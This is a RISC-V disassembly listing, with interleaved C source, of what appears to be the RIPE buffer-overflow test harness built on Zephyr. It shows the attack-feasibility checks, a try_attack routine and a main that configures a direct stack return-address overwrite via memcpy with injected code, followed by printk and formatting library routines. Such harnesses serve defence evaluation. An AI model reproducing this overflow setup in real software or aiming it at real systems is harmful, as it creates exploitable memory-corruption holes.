80002072:	1c079e63          	bnez	a5,8000224e <is_attack_possible+0x35a>
80002076:	40f2                	lw	ra,28(sp)
80002078:	6105                	addi	sp,sp,32
8000207a:	8082                	ret
            if ((attack.technique == DIRECT)) {
8000207c:	800097b7          	lui	a5,0x80009
80002080:	4dc7a703          	lw	a4,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80002084:	06400793          	li	a5,100
80002088:	00f70463          	beq	a4,a5,80002090 <is_attack_possible+0x19c>
    return TRUE;
8000208c:	4505                	li	a0,1
8000208e:	bfd9                	j	80002064 <is_attack_possible+0x170>
                if ((attack.code_ptr == FUNC_PTR_HEAP) ||
80002090:	800097b7          	lui	a5,0x80009
80002094:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80002098:	479c                	lw	a5,8(a5)
                  (attack.code_ptr == FUNC_PTR_BSS) ||
8000209a:	ed178693          	addi	a3,a5,-303
                if ((attack.code_ptr == FUNC_PTR_HEAP) ||
8000209e:	4709                	li	a4,2
800020a0:	04d77063          	bgeu	a4,a3,800020e0 <is_attack_possible+0x1ec>
                  (attack.code_ptr == FUNC_PTR_DATA) ||
800020a4:	13400713          	li	a4,308
800020a8:	02e78c63          	beq	a5,a4,800020e0 <is_attack_possible+0x1ec>
                  (attack.code_ptr == LONGJMP_BUF_HEAP) ||
800020ac:	13600713          	li	a4,310
800020b0:	02e78863          	beq	a5,a4,800020e0 <is_attack_possible+0x1ec>
                  (attack.code_ptr == LONGJMP_BUF_DATA) ||
800020b4:	13500713          	li	a4,309
800020b8:	02e78463          	beq	a5,a4,800020e0 <is_attack_possible+0x1ec>
                  (attack.code_ptr == LONGJMP_BUF_BSS) ||
800020bc:	13800713          	li	a4,312
800020c0:	02e78063          	beq	a5,a4,800020e0 <is_attack_possible+0x1ec>
                  (attack.code_ptr == STRUCT_FUNC_PTR_HEAP) ||
800020c4:	13900713          	li	a4,313
800020c8:	00e78c63          	beq	a5,a4,800020e0 <is_attack_possible+0x1ec>
                  (attack.code_ptr == STRUCT_FUNC_PTR_DATA) ||
800020cc:	13a00713          	li	a4,314
800020d0:	00e78863          	beq	a5,a4,800020e0 <is_attack_possible+0x1ec>
                } else if ((attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
800020d4:	12e00713          	li	a4,302
800020d8:	00e78b63          	beq	a5,a4,800020ee <is_attack_possible+0x1fa>
    return TRUE;
800020dc:	4505                	li	a0,1
800020de:	b759                	j	80002064 <is_attack_possible+0x170>
                    fprintf(stderr,
800020e0:	80008537          	lui	a0,0x80008
800020e4:	8d850513          	addi	a0,a0,-1832 # 800078d8 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800078d9>
800020e8:	24e5                	jal	800023d0 <printk>
                    return FALSE;
800020ea:	4501                	li	a0,0
800020ec:	bfa5                	j	80002064 <is_attack_possible+0x170>
                  ((attack.function == STRCAT) ||
800020ee:	800097b7          	lui	a5,0x80009
800020f2:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800020f6:	4b9c                	lw	a5,16(a5)
800020f8:	e0878693          	addi	a3,a5,-504
                } else if ((attack.code_ptr == FUNC_PTR_STACK_PARAM) &&
800020fc:	4705                	li	a4,1
800020fe:	00d77c63          	bgeu	a4,a3,80002116 <is_attack_possible+0x222>
                  (attack.function == SNPRINTF) ||
80002102:	1fb00713          	li	a4,507
80002106:	00e78863          	beq	a5,a4,80002116 <is_attack_possible+0x222>
                  (attack.function == SSCANF) ||
8000210a:	1fc00713          	li	a4,508
8000210e:	00e78463          	beq	a5,a4,80002116 <is_attack_possible+0x222>
    return TRUE;
80002112:	4505                	li	a0,1
80002114:	bf81                	j	80002064 <is_attack_possible+0x170>
                    fprintf(stderr,
80002116:	80008537          	lui	a0,0x80008
8000211a:	93050513          	addi	a0,a0,-1744 # 80007930 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007931>
8000211e:	2c4d                	jal	800023d0 <printk>
                    return FALSE;
80002120:	4501                	li	a0,0
80002122:	b789                	j	80002064 <is_attack_possible+0x170>
              ((attack.code_ptr == RET_ADDR) ||
80002124:	800097b7          	lui	a5,0x80009
80002128:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
8000212c:	479c                	lw	a5,8(a5)
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
8000212e:	ed478693          	addi	a3,a5,-300
            if ((attack.technique == DIRECT) &&
80002132:	4709                	li	a4,2
80002134:	00d77e63          	bgeu	a4,a3,80002150 <is_attack_possible+0x25c>
80002138:	ed078793          	addi	a5,a5,-304
8000213c:	4729                	li	a4,10
8000213e:	0ef76c63          	bltu	a4,a5,80002236 <is_attack_possible+0x342>
80002142:	6ef00713          	li	a4,1775
80002146:	00f757b3          	srl	a5,a4,a5
8000214a:	8b85                	andi	a5,a5,1
8000214c:	0e078763          	beqz	a5,8000223a <is_attack_possible+0x346>
                fprintf(stderr,
80002150:	80008537          	lui	a0,0x80008
80002154:	9bc50513          	addi	a0,a0,-1604 # 800079bc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800079bd>
80002158:	2ca5                	jal	800023d0 <printk>
                return FALSE;
8000215a:	4501                	li	a0,0
8000215c:	b721                	j	80002064 <is_attack_possible+0x170>
              ((attack.code_ptr == RET_ADDR) ||
8000215e:	800097b7          	lui	a5,0x80009
80002162:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
80002166:	479c                	lw	a5,8(a5)
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
80002168:	ed478693          	addi	a3,a5,-300
            if ((attack.technique == DIRECT) &&
8000216c:	4709                	li	a4,2
8000216e:	00d77e63          	bgeu	a4,a3,8000218a <is_attack_possible+0x296>
80002172:	ed178713          	addi	a4,a5,-303
80002176:	47ad                	li	a5,11
80002178:	0ce7e363          	bltu	a5,a4,8000223e <is_attack_possible+0x34a>
8000217c:	6785                	lui	a5,0x1
8000217e:	b7b78793          	addi	a5,a5,-1157 # b7b <CONFIG_NEWLIB_LIBC_MIN_REQUIRED_HEAP_SIZE+0x37b>
80002182:	00e7d7b3          	srl	a5,a5,a4
80002186:	8b85                	andi	a5,a5,1
80002188:	cfcd                	beqz	a5,80002242 <is_attack_possible+0x34e>
                fprintf(stderr,
8000218a:	80008537          	lui	a0,0x80008
8000218e:	a1450513          	addi	a0,a0,-1516 # 80007a14 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007a15>
80002192:	2c3d                	jal	800023d0 <printk>
                return FALSE;
80002194:	4501                	li	a0,0
80002196:	b5f9                	j	80002064 <is_attack_possible+0x170>
            if ((attack.technique == DIRECT) &&
80002198:	800097b7          	lui	a5,0x80009
8000219c:	4dc7a783          	lw	a5,1244(a5) # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800021a0:	06400713          	li	a4,100
800021a4:	00e78863          	beq	a5,a4,800021b4 <is_attack_possible+0x2c0>
            } else if ((attack.technique == INDIRECT) &&
800021a8:	06500713          	li	a4,101
800021ac:	04e78063          	beq	a5,a4,800021ec <is_attack_possible+0x2f8>
    return TRUE;
800021b0:	4505                	li	a0,1
800021b2:	bd4d                	j	80002064 <is_attack_possible+0x170>
              ((attack.code_ptr == RET_ADDR) ||
800021b4:	80009737          	lui	a4,0x80009
800021b8:	4dc70713          	addi	a4,a4,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800021bc:	4718                	lw	a4,8(a4)
              (attack.code_ptr == FUNC_PTR_STACK_VAR) ||
800021be:	ed470613          	addi	a2,a4,-300
            if ((attack.technique == DIRECT) &&
800021c2:	4689                	li	a3,2
800021c4:	00c6fd63          	bgeu	a3,a2,800021de <is_attack_possible+0x2ea>
800021c8:	ed170713          	addi	a4,a4,-303
800021cc:	46a9                	li	a3,10
800021ce:	fce6ede3          	bltu	a3,a4,800021a8 <is_attack_possible+0x2b4>
800021d2:	7bd00693          	li	a3,1981
800021d6:	00e6d733          	srl	a4,a3,a4
800021da:	8b05                	andi	a4,a4,1
800021dc:	d771                	beqz	a4,800021a8 <is_attack_possible+0x2b4>
                fprintf(stderr,
800021de:	80008537          	lui	a0,0x80008
800021e2:	a7450513          	addi	a0,a0,-1420 # 80007a74 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007a75>
800021e6:	22ed                	jal	800023d0 <printk>
                return FALSE;
800021e8:	4501                	li	a0,0
800021ea:	bdad                	j	80002064 <is_attack_possible+0x170>
              (attack.code_ptr == LONGJMP_BUF_HEAP) &&
800021ec:	800097b7          	lui	a5,0x80009
800021f0:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800021f4:	4798                	lw	a4,8(a5)
            } else if ((attack.technique == INDIRECT) &&
800021f6:	13400793          	li	a5,308
800021fa:	00f70463          	beq	a4,a5,80002202 <is_attack_possible+0x30e>
    return TRUE;
800021fe:	4505                	li	a0,1
80002200:	b595                	j	80002064 <is_attack_possible+0x170>
              (!(attack.function == MEMCPY) &&
80002202:	800097b7          	lui	a5,0x80009
80002206:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
8000220a:	4b9c                	lw	a5,16(a5)
              (attack.code_ptr == LONGJMP_BUF_HEAP) &&
8000220c:	1f400713          	li	a4,500
80002210:	02e78b63          	beq	a5,a4,80002246 <is_attack_possible+0x352>
              (!(attack.function == MEMCPY) &&
80002214:	1f600713          	li	a4,502
80002218:	02e78963          	beq	a5,a4,8000224a <is_attack_possible+0x356>
              !(attack.function == STRNCPY) &&
8000221c:	1fc00713          	li	a4,508
80002220:	00e79463          	bne	a5,a4,80002228 <is_attack_possible+0x334>
    return TRUE;
80002224:	4505                	li	a0,1
80002226:	bd3d                	j	80002064 <is_attack_possible+0x170>
                fprintf(stderr,
80002228:	80008537          	lui	a0,0x80008
8000222c:	acc50513          	addi	a0,a0,-1332 # 80007acc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007acd>
80002230:	2245                	jal	800023d0 <printk>
                return FALSE;
80002232:	4501                	li	a0,0
80002234:	bd05                	j	80002064 <is_attack_possible+0x170>
            if ((attack.technique == DIRECT) &&
80002236:	4505                	li	a0,1
80002238:	b535                	j	80002064 <is_attack_possible+0x170>
8000223a:	4505                	li	a0,1
8000223c:	b525                	j	80002064 <is_attack_possible+0x170>
            if ((attack.technique == DIRECT) &&
8000223e:	4505                	li	a0,1
80002240:	b515                	j	80002064 <is_attack_possible+0x170>
80002242:	4505                	li	a0,1
80002244:	b505                	j	80002064 <is_attack_possible+0x170>
    return TRUE;
80002246:	4505                	li	a0,1
80002248:	bd31                	j	80002064 <is_attack_possible+0x170>
8000224a:	4505                	li	a0,1
8000224c:	bd21                	j	80002064 <is_attack_possible+0x170>
} /* is_attack_possible */
8000224e:	2a5030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002252 <try_attack>:
{
80002252:	714d                	addi	sp,sp,-336
80002254:	14112623          	sw	ra,332(sp)
80002258:	8000c7b7          	lui	a5,0x8000c
8000225c:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002260:	12e12e23          	sw	a4,316(sp)
80002264:	4701                	li	a4,0
    if (is_attack_possible()) {
80002266:	3179                	jal	80001ef4 <is_attack_possible>
80002268:	c50d                	beqz	a0,80002292 <try_attack+0x40>
        perform_attack(&dummy_function, stack_jmp_buffer_param);
8000226a:	002c                	addi	a1,sp,8
8000226c:	80001537          	lui	a0,0x80001
80002270:	b1e50513          	addi	a0,a0,-1250 # 80000b1e <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80000b1f>
80002274:	880ff0ef          	jal	ra,800012f4 <perform_attack>
}
80002278:	8000c7b7          	lui	a5,0x8000c
8000227c:	13c12703          	lw	a4,316(sp)
80002280:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002284:	8fb9                	xor	a5,a5,a4
80002286:	4701                	li	a4,0
80002288:	eb89                	bnez	a5,8000229a <try_attack+0x48>
8000228a:	14c12083          	lw	ra,332(sp)
8000228e:	6171                	addi	sp,sp,336
80002290:	8082                	ret
        exit(ATTACK_IMPOSSIBLE);
80002292:	c7c00513          	li	a0,-900
80002296:	7c7030ef          	jal	ra,8000625c <exit>
}
8000229a:	259030ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000229e <main>:
{
8000229e:	1101                	addi	sp,sp,-32
800022a0:	ce06                	sw	ra,28(sp)
800022a2:	cc22                	sw	s0,24(sp)
800022a4:	8000c437          	lui	s0,0x8000c
800022a8:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800022ac:	c63e                	sw	a5,12(sp)
800022ae:	4781                	li	a5,0
    attack.technique = DIRECT;
800022b0:	800097b7          	lui	a5,0x80009
800022b4:	4dc78793          	addi	a5,a5,1244 # 800094dc <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800094dd>
800022b8:	06400713          	li	a4,100
800022bc:	c398                	sw	a4,0(a5)
    attack.inject_param = INJECTED_CODE_NO_NOP;
800022be:	0c800713          	li	a4,200
800022c2:	c3d8                	sw	a4,4(a5)
    attack.code_ptr= RET_ADDR;
800022c4:	12c00713          	li	a4,300
800022c8:	c798                	sw	a4,8(a5)
    attack.location = STACK;
800022ca:	19000713          	li	a4,400
800022ce:	c7d8                	sw	a4,12(a5)
    attack.function = MEMCPY;
800022d0:	1f400713          	li	a4,500
800022d4:	cb98                	sw	a4,16(a5)
    printk("RIPE is alive! %s\n", CONFIG_BOARD);
800022d6:	800085b7          	lui	a1,0x80008
800022da:	b1c58593          	addi	a1,a1,-1252 # 80007b1c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007b1d>
800022de:	80008537          	lui	a0,0x80008
800022e2:	b2c50513          	addi	a0,a0,-1236 # 80007b2c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007b2d>
800022e6:	20ed                	jal	800023d0 <printk>
    print_current_test_parameters();
800022e8:	945fe0ef          	jal	ra,80000c2c <print_current_test_parameters>
    try_attack();
800022ec:	379d                	jal	80002252 <try_attack>
    printf("Unexpected back in main\n");
800022ee:	80008537          	lui	a0,0x80008
800022f2:	b4050513          	addi	a0,a0,-1216 # 80007b40 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007b41>
800022f6:	28e9                	jal	800023d0 <printk>
}
800022f8:	4732                	lw	a4,12(sp)
800022fa:	95042783          	lw	a5,-1712(s0)
800022fe:	8fb9                	xor	a5,a5,a4
80002300:	4701                	li	a4,0
80002302:	e789                	bnez	a5,8000230c <main+0x6e>
80002304:	40f2                	lw	ra,28(sp)
80002306:	4462                	lw	s0,24(sp)
80002308:	6105                	addi	sp,sp,32
8000230a:	8082                	ret
8000230c:	1e7030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002310 <arch_printk_char_out>:
 *
 * @return 0
 */
/* LCOV_EXCL_START */
__attribute__((weak)) int arch_printk_char_out(int c)
{
80002310:	1101                	addi	sp,sp,-32
80002312:	ce06                	sw	ra,28(sp)
80002314:	8000c7b7          	lui	a5,0x8000c
80002318:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000231c:	c63a                	sw	a4,12(sp)
8000231e:	4701                	li	a4,0
	ARG_UNUSED(c);

	/* do nothing */
	return 0;
}
80002320:	4732                	lw	a4,12(sp)
80002322:	9507a783          	lw	a5,-1712(a5)
80002326:	8fb9                	xor	a5,a5,a4
80002328:	4701                	li	a4,0
8000232a:	e789                	bnez	a5,80002334 <arch_printk_char_out+0x24>
8000232c:	4501                	li	a0,0
8000232e:	40f2                	lw	ra,28(sp)
80002330:	6105                	addi	sp,sp,32
80002332:	8082                	ret
80002334:	1bf030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002338 <char_out>:

	return c;
}

static int char_out(int c, void *ctx_p)
{
80002338:	1101                	addi	sp,sp,-32
8000233a:	ce06                	sw	ra,28(sp)
8000233c:	cc22                	sw	s0,24(sp)
8000233e:	8000c437          	lui	s0,0x8000c
80002342:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002346:	c63e                	sw	a5,12(sp)
80002348:	4781                	li	a5,0
	(void) ctx_p;
	return _char_out(c);
8000234a:	81c1a783          	lw	a5,-2020(gp) # 8000c004 <_char_out>
8000234e:	9782                	jalr	a5
}
80002350:	4732                	lw	a4,12(sp)
80002352:	95042783          	lw	a5,-1712(s0)
80002356:	8fb9                	xor	a5,a5,a4
80002358:	4701                	li	a4,0
8000235a:	e789                	bnez	a5,80002364 <char_out+0x2c>
8000235c:	40f2                	lw	ra,28(sp)
8000235e:	4462                	lw	s0,24(sp)
80002360:	6105                	addi	sp,sp,32
80002362:	8082                	ret
80002364:	18f030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002368 <__printk_hook_install>:
{
80002368:	1101                	addi	sp,sp,-32
8000236a:	ce06                	sw	ra,28(sp)
8000236c:	8000c7b7          	lui	a5,0x8000c
80002370:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002374:	c63a                	sw	a4,12(sp)
80002376:	4701                	li	a4,0
	_char_out = fn;
80002378:	80a1ae23          	sw	a0,-2020(gp) # 8000c004 <_char_out>
}
8000237c:	4732                	lw	a4,12(sp)
8000237e:	9507a783          	lw	a5,-1712(a5)
80002382:	8fb9                	xor	a5,a5,a4
80002384:	4701                	li	a4,0
80002386:	e781                	bnez	a5,8000238e <__printk_hook_install+0x26>
80002388:	40f2                	lw	ra,28(sp)
8000238a:	6105                	addi	sp,sp,32
8000238c:	8082                	ret
8000238e:	165030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002392 <vprintk>:

void vprintk(const char *fmt, va_list ap)
{
80002392:	1101                	addi	sp,sp,-32
80002394:	ce06                	sw	ra,28(sp)
80002396:	cc22                	sw	s0,24(sp)
80002398:	862a                	mv	a2,a0
8000239a:	86ae                	mv	a3,a1
8000239c:	8000c437          	lui	s0,0x8000c
800023a0:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800023a4:	c63e                	sw	a5,12(sp)
800023a6:	4781                	li	a5,0
int cbvprintf(cbprintf_cb out, void *ctx, const char *format, va_list ap);
#else
static inline
int cbvprintf(cbprintf_cb out, void *ctx, const char *format, va_list ap)
{
	return z_cbvprintf_impl(out, ctx, format, ap, 0);
800023a8:	4701                	li	a4,0
800023aa:	4581                	li	a1,0
800023ac:	80002537          	lui	a0,0x80002
800023b0:	33850513          	addi	a0,a0,824 # 80002338 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80002339>
800023b4:	0af000ef          	jal	ra,80002c62 <z_cbvprintf_impl>

#ifdef CONFIG_PRINTK_SYNC
		k_spin_unlock(&lock, key);
#endif
	}
}
800023b8:	4732                	lw	a4,12(sp)
800023ba:	95042783          	lw	a5,-1712(s0)
800023be:	8fb9                	xor	a5,a5,a4
800023c0:	4701                	li	a4,0
800023c2:	e789                	bnez	a5,800023cc <vprintk+0x3a>
800023c4:	40f2                	lw	ra,28(sp)
800023c6:	4462                	lw	s0,24(sp)
800023c8:	6105                	addi	sp,sp,32
800023ca:	8082                	ret
800023cc:	127030ef          	jal	ra,80005cf2 <_StackCheckHandler>

800023d0 <printk>:
 *
 * @param fmt formatted string to output
 */

void printk(const char *fmt, ...)
{
800023d0:	7139                	addi	sp,sp,-64
800023d2:	ce06                	sw	ra,28(sp)
800023d4:	cc22                	sw	s0,24(sp)
800023d6:	d22e                	sw	a1,36(sp)
800023d8:	d432                	sw	a2,40(sp)
800023da:	d636                	sw	a3,44(sp)
800023dc:	d83a                	sw	a4,48(sp)
800023de:	da3e                	sw	a5,52(sp)
800023e0:	dc42                	sw	a6,56(sp)
800023e2:	de46                	sw	a7,60(sp)
800023e4:	8000c437          	lui	s0,0x8000c
800023e8:	95042783          	lw	a5,-1712(s0) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800023ec:	c63e                	sw	a5,12(sp)
800023ee:	4781                	li	a5,0
	va_list ap;

	va_start(ap, fmt);
800023f0:	104c                	addi	a1,sp,36
800023f2:	c42e                	sw	a1,8(sp)

	vprintk(fmt, ap);
800023f4:	3f79                	jal	80002392 <vprintk>

	va_end(ap);
}
800023f6:	4732                	lw	a4,12(sp)
800023f8:	95042783          	lw	a5,-1712(s0)
800023fc:	8fb9                	xor	a5,a5,a4
800023fe:	4701                	li	a4,0
80002400:	e789                	bnez	a5,8000240a <printk+0x3a>
80002402:	40f2                	lw	ra,28(sp)
80002404:	4462                	lw	s0,24(sp)
80002406:	6121                	addi	sp,sp,64
80002408:	8082                	ret
8000240a:	0e9030ef          	jal	ra,80005cf2 <_StackCheckHandler>

8000240e <z_thread_entry>:
 * This routine does not return, and is marked as such so the compiler won't
 * generate preamble code that is only used by functions that actually return.
 */
FUNC_NORETURN void z_thread_entry(k_thread_entry_t entry,
				 void *p1, void *p2, void *p3)
{
8000240e:	7179                	addi	sp,sp,-48
80002410:	d606                	sw	ra,44(sp)
80002412:	d422                	sw	s0,40(sp)
80002414:	d226                	sw	s1,36(sp)
80002416:	d04a                	sw	s2,32(sp)
80002418:	ce4e                	sw	s3,28(sp)
8000241a:	cc52                	sw	s4,24(sp)
8000241c:	84aa                	mv	s1,a0
8000241e:	892e                	mv	s2,a1
80002420:	89b2                	mv	s3,a2
80002422:	8a36                	mv	s4,a3
80002424:	8000c7b7          	lui	a5,0x8000c
80002428:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
8000242c:	c63a                	sw	a4,12(sp)
8000242e:	4701                	li	a4,0
	if (z_syscall_trap()) {
		return (k_tid_t) arch_syscall_invoke0(K_SYSCALL_Z_CURRENT_GET);
	}
#endif
	compiler_barrier();
	return z_impl_z_current_get();
80002430:	7d8030ef          	jal	ra,80005c08 <z_impl_z_current_get>
#ifdef CONFIG_THREAD_LOCAL_STORAGE
	z_tls_current = z_current_get();
80002434:	00a22023          	sw	a0,0(tp) # 0 <CONFIG_2ND_LVL_INTR_01_OFFSET>
#endif
	entry(p1, p2, p3);
80002438:	8652                	mv	a2,s4
8000243a:	85ce                	mv	a1,s3
8000243c:	854a                	mv	a0,s2
8000243e:	9482                	jalr	s1
 */
__attribute_const__
static inline k_tid_t k_current_get(void)
{
#ifdef CONFIG_THREAD_LOCAL_STORAGE
	return z_tls_current;
80002440:	00022503          	lw	a0,0(tp) # 0 <CONFIG_2ND_LVL_INTR_01_OFFSET>
		(void) arch_syscall_invoke1(parm0.x, K_SYSCALL_K_THREAD_ABORT);
		return;
	}
#endif
	compiler_barrier();
	z_impl_k_thread_abort(thread);
80002444:	083030ef          	jal	ra,80005cc6 <z_impl_k_thread_abort>

80002448 <extract_decimal>:
 * the referenced text.
 *
 * @return the decoded integer value.
 */
static size_t extract_decimal(const char **str)
{
80002448:	1101                	addi	sp,sp,-32
8000244a:	ce06                	sw	ra,28(sp)
8000244c:	862a                	mv	a2,a0
8000244e:	8000c7b7          	lui	a5,0x8000c
80002452:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002456:	c63a                	sw	a4,12(sp)
80002458:	4701                	li	a4,0
	const char *sp = *str;
8000245a:	4118                	lw	a4,0(a0)
	size_t val = 0;
8000245c:	4501                	li	a0,0

	while (isdigit((int)(unsigned char)*sp)) {
8000245e:	a809                	j	80002470 <extract_decimal+0x28>
		val = 10U * val + *sp++ - '0';
80002460:	00251793          	slli	a5,a0,0x2
80002464:	97aa                	add	a5,a5,a0
80002466:	0786                	slli	a5,a5,0x1
80002468:	0705                	addi	a4,a4,1
8000246a:	97b6                	add	a5,a5,a3
8000246c:	fd078513          	addi	a0,a5,-48
	while (isdigit((int)(unsigned char)*sp)) {
80002470:	00074683          	lbu	a3,0(a4)
80002474:	800087b7          	lui	a5,0x80008
80002478:	0e978793          	addi	a5,a5,233 # 800080e9 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x800080ea>
8000247c:	97b6                	add	a5,a5,a3
8000247e:	0007c783          	lbu	a5,0(a5)
80002482:	8b91                	andi	a5,a5,4
80002484:	fff1                	bnez	a5,80002460 <extract_decimal+0x18>
	}
	*str = sp;
80002486:	c218                	sw	a4,0(a2)
	return val;
}
80002488:	8000c7b7          	lui	a5,0x8000c
8000248c:	4732                	lw	a4,12(sp)
8000248e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002492:	8fb9                	xor	a5,a5,a4
80002494:	4701                	li	a4,0
80002496:	e781                	bnez	a5,8000249e <extract_decimal+0x56>
80002498:	40f2                	lw	ra,28(sp)
8000249a:	6105                	addi	sp,sp,32
8000249c:	8082                	ret
8000249e:	055030ef          	jal	ra,80005cf2 <_StackCheckHandler>

800024a2 <extract_flags>:
 *
 * @return a pointer the first character that follows the flags.
 */
static inline const char *extract_flags(struct conversion *conv,
					const char *sp)
{
800024a2:	1101                	addi	sp,sp,-32
800024a4:	ce06                	sw	ra,28(sp)
800024a6:	862a                	mv	a2,a0
800024a8:	852e                	mv	a0,a1
800024aa:	8000c7b7          	lui	a5,0x8000c
800024ae:	9507a703          	lw	a4,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
800024b2:	c63a                	sw	a4,12(sp)
800024b4:	4701                	li	a4,0
	bool loop = true;
800024b6:	4685                	li	a3,1
800024b8:	a881                	j	80002508 <extract_flags+0x66>

	do {
		switch (*sp) {
		case '-':
			conv->flag_dash = true;
800024ba:	00065783          	lhu	a5,0(a2)
800024be:	0047e793          	ori	a5,a5,4
800024c2:	00f61023          	sh	a5,0(a2)
			conv->flag_zero = true;
			break;
		default:
			loop = false;
		}
		if (loop) {
800024c6:	c2a1                	beqz	a3,80002506 <extract_flags+0x64>
			++sp;
800024c8:	0505                	addi	a0,a0,1
800024ca:	a835                	j	80002506 <extract_flags+0x64>
			conv->flag_plus = true;
800024cc:	00065783          	lhu	a5,0(a2)
800024d0:	0087e793          	ori	a5,a5,8
800024d4:	00f61023          	sh	a5,0(a2)
			break;
800024d8:	b7fd                	j	800024c6 <extract_flags+0x24>
			conv->flag_space = true;
800024da:	00065783          	lhu	a5,0(a2)
800024de:	0107e793          	ori	a5,a5,16
800024e2:	00f61023          	sh	a5,0(a2)
			break;
800024e6:	b7c5                	j	800024c6 <extract_flags+0x24>
			conv->flag_hash = true;
800024e8:	00065783          	lhu	a5,0(a2)
800024ec:	0207e793          	ori	a5,a5,32
800024f0:	00f61023          	sh	a5,0(a2)
			break;
800024f4:	bfc9                	j	800024c6 <extract_flags+0x24>
			conv->flag_zero = true;
800024f6:	00065783          	lhu	a5,0(a2)
800024fa:	0407e793          	ori	a5,a5,64
800024fe:	00f61023          	sh	a5,0(a2)
			break;
80002502:	b7d1                	j	800024c6 <extract_flags+0x24>
		switch (*sp) {
80002504:	4681                	li	a3,0
		}
	} while (loop);
80002506:	c295                	beqz	a3,8000252a <extract_flags+0x88>
		switch (*sp) {
80002508:	00054783          	lbu	a5,0(a0)
8000250c:	1781                	addi	a5,a5,-32
8000250e:	0ff7f593          	zext.b	a1,a5
80002512:	4741                	li	a4,16
80002514:	feb768e3          	bltu	a4,a1,80002504 <extract_flags+0x62>
80002518:	00259793          	slli	a5,a1,0x2
8000251c:	80008737          	lui	a4,0x80008
80002520:	d6c70713          	addi	a4,a4,-660 # 80007d6c <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x80007d6d>
80002524:	97ba                	add	a5,a5,a4
80002526:	439c                	lw	a5,0(a5)
80002528:	8782                	jr	a5

	/* zero && dash => !zero */
	if (conv->flag_zero && conv->flag_dash) {
8000252a:	421c                	lw	a5,0(a2)
8000252c:	0447f793          	andi	a5,a5,68
80002530:	04400713          	li	a4,68
80002534:	00e78d63          	beq	a5,a4,8000254e <extract_flags+0xac>
	}

	/* space && plus => !plus, handled in emitter code */

	return sp;
}
80002538:	8000c7b7          	lui	a5,0x8000c
8000253c:	4732                	lw	a4,12(sp)
8000253e:	9507a783          	lw	a5,-1712(a5) # 8000b950 <CONFIG_SYSTEM_WORKQUEUE_PRIORITY+0x8000b951>
80002542:	8fb9                	xor	a5,a5,a4
80002544:	4701                	li	a4,0
80002546:	eb99                	bnez	a5,8000255c <extract_flags+0xba>
80002548:	40f2                	lw	ra,28(sp)
8000254a:	6105                	addi	sp,sp,32
8000254c:	8082                	ret
		conv->flag_zero = false;
8000254e:	00065783          	lhu	a5,0(a2)
80002552:	fbf7f793          	andi	a5,a5,-65
80002556:	00f61023          	sh	a5,0(a2)
8000255a:	bff9                	j	80002538 <extract_flags+0x96>
}
8000255c:	796030ef          	jal	ra,80005cf2 <_StackCheckHandler>

80002560 <extract_width>:
 *
 * @return a pointer the first character that follows the width.
 */
